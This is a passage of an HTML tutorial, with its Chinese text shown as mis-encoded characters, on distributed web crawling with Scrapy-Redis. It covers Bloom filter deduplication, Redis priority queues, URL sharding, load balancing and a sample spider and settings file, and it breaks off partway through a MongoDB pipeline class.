          <tr>
            <th>æ•°æ®é‡</th>
            <th>ä½æ•°ç»„å¤§å° (bit)</th>
            <th>å“ˆå¸Œå‡½æ•°ä¸ªæ•°</th>
            <th>è¯¯åˆ¤ç‡</th>
            <th>å†…å­˜å ç”¨</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>1000ä¸‡</td>
            <td>2^27 (128M)</td>
            <td>6</td>
            <td>0.1%</td>
            <td>16 MB</td>
          </tr>
          <tr>
            <td>1äº¿</td>
            <td>2^30 (1G)</td>
            <td>6</td>
            <td>0.1%</td>
            <td>128 MB</td>
          </tr>
          <tr>
            <td>10äº¿</td>
            <td>2^33 (8G)</td>
            <td>7</td>
            <td>0.01%</td>
            <td>1 GB</td>
          </tr>
        </tbody>
      </table>

      <p><strong>å®ç°ç¤ºä¾‹ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å®‰è£…ï¼špip install scrapy-redis-bloomfilter</span>
<span class="c1"># settings.py</span>
<span class="n">DUPEFILTER_CLASS</span> <span class="o">=</span> <span class="s1">&#39;scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter&#39;</span>

<span class="c1"># BloomFilter é…ç½®</span>
<span class="n">BLOOMFILTER_HASH_NUMBER</span> <span class="o">=</span> <span class="mi">6</span>  <span class="c1"># å“ˆå¸Œå‡½æ•°ä¸ªæ•°</span>
<span class="n">BLOOMFILTER_BIT</span> <span class="o">=</span> <span class="mi">30</span>         <span class="c1"># ä½æ•°ç»„å¤§å° 2^30 (çº¦1G)</span>

<span class="c1"># Redis é…ç½®</span>
<span class="n">REDIS_HOST</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
<span class="n">REDIS_PORT</span> <span class="o">=</span> <span class="mi">6379</span>
</code></pre>
      </div>

      <p><strong>æ‰‹åŠ¨å®ç° Bloom Filterï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">mmh3</span>  <span class="c1"># pip install mmh3</span>

<span class="k">class</span><span class="w"> </span><span class="nc">BloomFilter</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">bit_size</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="n">hash_count</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;crawler:bloomfilter&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">bit_size</span> <span class="o">=</span> <span class="n">bit_size</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">hash_count</span> <span class="o">=</span> <span class="n">hash_count</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit_size</span>  <span class="c1"># 2^bit_size</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_hash</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆå¤šä¸ªå“ˆå¸Œå€¼&quot;&quot;&quot;</span>
        <span class="n">hashes</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">hash_count</span><span class="p">):</span>
            <span class="n">hash_val</span> <span class="o">=</span> <span class="n">mmh3</span><span class="o">.</span><span class="n">hash</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">size</span>
            <span class="n">hashes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">hash_val</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">hashes</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ  URL&quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">hash_val</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_hash</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">setbit</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">hash_val</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">contains</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥ URL æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">hash_val</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_hash</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">getbit</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">hash_val</span><span class="p">):</span>
                <span class="k">return</span> <span class="kc">False</span>
        <span class="k">return</span> <span class="kc">True</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">check_and_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥å¹¶æ·»åŠ &quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
            <span class="k">return</span> <span class="kc">False</span>  <span class="c1"># å·²å­˜åœ¨ï¼ˆæˆ–è¯¯åˆ¤ï¼‰</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">True</span>  <span class="c1"># æ–° URL</span>
</code></pre>
      </div>

      <h4 id="3-åŸºäº-berkeley-db-leveldb">3. åŸºäº Berkeley DB / LevelDB</h4>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šURL æ•°é‡ç‰¹åˆ«å¤§ï¼Œéœ€è¦æŒä¹…åŒ–å­˜å‚¨ã€‚</p>

      <p><strong>ä¼˜ç‚¹</strong>ï¼š</p>

      <ul>
        <li>æ”¯æŒç£ç›˜å­˜å‚¨ï¼Œä¸å—å†…å­˜é™åˆ¶</li>
        <li>æ”¯æŒé«˜æ•ˆçš„é”®å€¼æŸ¥è¯¢</li>
      </ul>

      <p><strong>ç¼ºç‚¹</strong>ï¼š</p>

      <ul>
        <li>é€Ÿåº¦æ¯” Redis æ…¢</li>
        <li>éœ€è¦ç£ç›˜ I/O</li>
      </ul>

      <h3 id="ä»»åŠ¡è°ƒåº¦ç­–ç•¥">ä»»åŠ¡è°ƒåº¦ç­–ç•¥</h3>

      <h4 id="1-ä¼˜å…ˆçº§è°ƒåº¦">1. ä¼˜å…ˆçº§è°ƒåº¦</h4>

      <p>ä½¿ç”¨ Redis ZSetï¼ˆæœ‰åºé›†åˆï¼‰å®ç°ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>

<span class="k">class</span><span class="w"> </span><span class="nc">PriorityQueue</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;crawler:priority_queue&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">priority</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ ä»»åŠ¡ï¼Œpriority è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zadd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span><span class="n">url</span><span class="p">:</span> <span class="o">-</span><span class="n">priority</span><span class="p">})</span>  <span class="c1"># è´Ÿå€¼ä½¿å¾—å¤§ä¼˜å…ˆçº§æ’å‰</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">pop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å–å‡ºæœ€é«˜ä¼˜å…ˆçº§ä»»åŠ¡&quot;&quot;&quot;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zpopmin</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
            <span class="n">url</span><span class="p">,</span> <span class="n">score</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">return</span> <span class="n">url</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">size</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é˜Ÿåˆ—å¤§å°&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zcard</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">queue</span> <span class="o">=</span> <span class="n">PriorityQueue</span><span class="p">()</span>

<span class="c1"># æ·»åŠ ä¸åŒä¼˜å…ˆçº§çš„ä»»åŠ¡</span>
<span class="n">queue</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;http://example.com/important&#39;</span><span class="p">,</span> <span class="n">priority</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
<span class="n">queue</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;http://example.com/normal&#39;</span><span class="p">,</span> <span class="n">priority</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="n">queue</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;http://example.com/low&#39;</span><span class="p">,</span> <span class="n">priority</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># æŒ‰ä¼˜å…ˆçº§å–å‡º</span>
<span class="nb">print</span><span class="p">(</span><span class="n">queue</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>  <span class="c1"># http://example.com/important</span>
</code></pre>
      </div>

      <h4 id="2-ä»»åŠ¡åˆ†ç‰‡">2. ä»»åŠ¡åˆ†ç‰‡</h4>

      <p>å°† URL æŒ‰å“ˆå¸Œå€¼åˆ†ç‰‡ï¼Œæ¯ä¸ªçˆ¬è™«èŠ‚ç‚¹è´Ÿè´£ç‰¹å®šçš„åˆ†ç‰‡ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ShardedCrawler</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">shard_id</span><span class="p">,</span> <span class="n">total_shards</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">shard_id</span> <span class="o">=</span> <span class="n">shard_id</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">total_shards</span> <span class="o">=</span> <span class="n">total_shards</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">belongs_to_me</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆ¤æ–­ URL æ˜¯å¦å±äºå½“å‰åˆ†ç‰‡&quot;&quot;&quot;</span>
        <span class="n">url_hash</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">shard</span> <span class="o">=</span> <span class="n">url_hash</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">total_shards</span>
        <span class="k">return</span> <span class="n">shard</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">shard_id</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">should_crawl</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ˜¯å¦åº”è¯¥çˆ¬å–æ­¤ URL&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">belongs_to_me</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>å¯åŠ¨å¤šä¸ªåˆ†ç‰‡ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¯åŠ¨ 4 ä¸ªçˆ¬è™«èŠ‚ç‚¹ï¼Œæ¯ä¸ªè´Ÿè´£ 1/4 çš„ URL</span>
python<span class="w"> </span>crawler.py<span class="w"> </span>--shard-id<span class="w"> </span><span class="m">0</span><span class="w"> </span>--total-shards<span class="w"> </span><span class="m">4</span>
python<span class="w"> </span>crawler.py<span class="w"> </span>--shard-id<span class="w"> </span><span class="m">1</span><span class="w"> </span>--total-shards<span class="w"> </span><span class="m">4</span>
python<span class="w"> </span>crawler.py<span class="w"> </span>--shard-id<span class="w"> </span><span class="m">2</span><span class="w"> </span>--total-shards<span class="w"> </span><span class="m">4</span>
python<span class="w"> </span>crawler.py<span class="w"> </span>--shard-id<span class="w"> </span><span class="m">3</span><span class="w"> </span>--total-shards<span class="w"> </span><span class="m">4</span>
</code></pre>
      </div>

      <h3 id="è´Ÿè½½å‡è¡¡">è´Ÿè½½å‡è¡¡</h3>

      <h4 id="åŠ¨æ€è´Ÿè½½è°ƒæ•´">åŠ¨æ€è´Ÿè½½è°ƒæ•´</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">LoadBalancer</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">node_id</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">node_id</span> <span class="o">=</span> <span class="n">node_id</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">heartbeat_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;crawler:heartbeat:</span><span class="si">{</span><span class="n">node_id</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">load_key</span> <span class="o">=</span> <span class="s1">&#39;crawler:node_loads&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">report_heartbeat</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">current_load</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸ŠæŠ¥å¿ƒè·³å’Œå½“å‰è´Ÿè½½&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">setex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">heartbeat_key</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="n">current_load</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zadd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">load_key</span><span class="p">,</span> <span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">node_id</span><span class="p">:</span> <span class="n">current_load</span><span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_active_nodes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ´»è·ƒèŠ‚ç‚¹&quot;&quot;&quot;</span>
        <span class="n">nodes</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">scan_iter</span><span class="p">(</span><span class="s1">&#39;crawler:heartbeat:*&#39;</span><span class="p">):</span>
            <span class="n">node_id</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">load</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">or</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">nodes</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">node_id</span><span class="p">,</span> <span class="n">load</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">nodes</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_least_loaded_node</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–è´Ÿè½½æœ€å°çš„èŠ‚ç‚¹&quot;&quot;&quot;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrange</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">load_key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">withscores</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
            <span class="n">node_id</span><span class="p">,</span> <span class="n">load</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">return</span> <span class="n">node_id</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="nb">int</span><span class="p">(</span><span class="n">load</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜ç¤ºä¾‹">å®æˆ˜ç¤ºä¾‹</h2>

      <h3 id="ç¤ºä¾‹1scrapy-redis-å®Œæ•´å®ç°">ç¤ºä¾‹1ï¼šScrapy-Redis å®Œæ•´å®ç°</h3>

      <p><strong>é¡¹ç›®ç»“æ„ï¼š</strong></p>

      <pre><code>distributed_crawler/
â”œâ”€â”€ scrapy.cfg
â”œâ”€â”€ crawler/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â”œâ”€â”€ spiders/
â”‚   â”‚   â”œâ”€â”€ __init__.py
â”‚   â”‚   â””â”€â”€ example_spider.py
â”‚   â”œâ”€â”€ items.py
â”‚   â””â”€â”€ pipelines.py
â””â”€â”€ requirements.txt
</code></pre>

      <p><strong>settings.py é…ç½®ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Scrapy-Redis é…ç½®</span>
<span class="n">SCHEDULER</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis.scheduler.Scheduler&quot;</span>
<span class="n">DUPEFILTER_CLASS</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter&quot;</span>

<span class="c1"># BloomFilter é…ç½®</span>
<span class="n">BLOOMFILTER_HASH_NUMBER</span> <span class="o">=</span> <span class="mi">6</span>
<span class="n">BLOOMFILTER_BIT</span> <span class="o">=</span> <span class="mi">30</span>  <span class="c1"># æ”¯æŒçº¦ 1 äº¿ URL</span>

<span class="c1"># Redis é…ç½®</span>
<span class="n">REDIS_HOST</span> <span class="o">=</span> <span class="s1">&#39;redis.example.com&#39;</span>
<span class="n">REDIS_PORT</span> <span class="o">=</span> <span class="mi">6379</span>
<span class="n">REDIS_PARAMS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;yourpassword&#39;</span><span class="p">,</span> <span class="s1">&#39;db&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>

<span class="c1"># æŒä¹…åŒ–é˜Ÿåˆ—</span>
<span class="n">SCHEDULER_PERSIST</span> <span class="o">=</span> <span class="kc">True</span>

<span class="c1"># Pipeline é…ç½®</span>
<span class="n">ITEM_PIPELINES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;crawler.pipelines.MongoDBPipeline&#39;</span><span class="p">:</span> <span class="mi">300</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># MongoDB é…ç½®</span>
<span class="n">MONGODB_URI</span> <span class="o">=</span> <span class="s1">&#39;mongodb://localhost:27017&#39;</span>
<span class="n">MONGODB_DATABASE</span> <span class="o">=</span> <span class="s1">&#39;crawler&#39;</span>

<span class="c1"># å¹¶å‘é…ç½®</span>
<span class="n">CONCURRENT_REQUESTS</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">CONCURRENT_REQUESTS_PER_DOMAIN</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="mf">0.5</span>

<span class="c1"># è‡ªåŠ¨é™é€Ÿ</span>
<span class="n">AUTOTHROTTLE_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">AUTOTHROTTLE_START_DELAY</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">AUTOTHROTTLE_TARGET_CONCURRENCY</span> <span class="o">=</span> <span class="mi">32</span>
</code></pre>
      </div>

      <p><strong>çˆ¬è™«å®ç°ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># spiders/example_spider.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy_redis.spiders</span><span class="w"> </span><span class="kn">import</span> <span class="n">RedisSpider</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">crawler.items</span><span class="w"> </span><span class="kn">import</span> <span class="n">NewsItem</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ExampleSpider</span><span class="p">(</span><span class="n">RedisSpider</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;example&#39;</span>
    <span class="n">redis_key</span> <span class="o">=</span> <span class="s1">&#39;example:start_urls&#39;</span>

    <span class="n">custom_settings</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;DEPTH_LIMIT&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>  <span class="c1"># æœ€å¤§æ·±åº¦</span>
    <span class="p">}</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æåˆ—è¡¨é¡µ&quot;&quot;&quot;</span>
        <span class="c1"># æå–æ–°é—»é“¾æ¥</span>
        <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;a.news-link::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getall</span><span class="p">():</span>
            <span class="k">yield</span> <span class="n">response</span><span class="o">.</span><span class="n">follow</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_detail</span><span class="p">)</span>

        <span class="c1"># æå–ä¸‹ä¸€é¡µ</span>
        <span class="n">next_page</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;a.next-page::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">next_page</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">response</span><span class="o">.</span><span class="n">follow</span><span class="p">(</span><span class="n">next_page</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_detail</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æè¯¦æƒ…é¡µ&quot;&quot;&quot;</span>
        <span class="n">item</span> <span class="o">=</span> <span class="n">NewsItem</span><span class="p">()</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">url</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;h1::text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;div.content::text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getall</span><span class="p">()</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;publish_time&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;span.time::text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="k">yield</span> <span class="n">item</span>
</code></pre>
      </div>

      <p><strong>Pipeline å®ç°ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># pipelines.py</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pymongo</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">itemadapter</span><span class="w"> </span><span class="kn">import</span> <span class="n">ItemAdapter</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MongoDBPipeline</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">mongo_uri</span><span class="p">,</span> <span class="n">mongo_db</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_uri</span> <span class="o">=</span> <span class="n">mongo_uri</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_db</span> <span class="o">=</span> <span class="n">mongo_db</span>

    <span class="nd">@classmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">from_crawler</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">crawler</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">cls</span><span class="p">(</span>
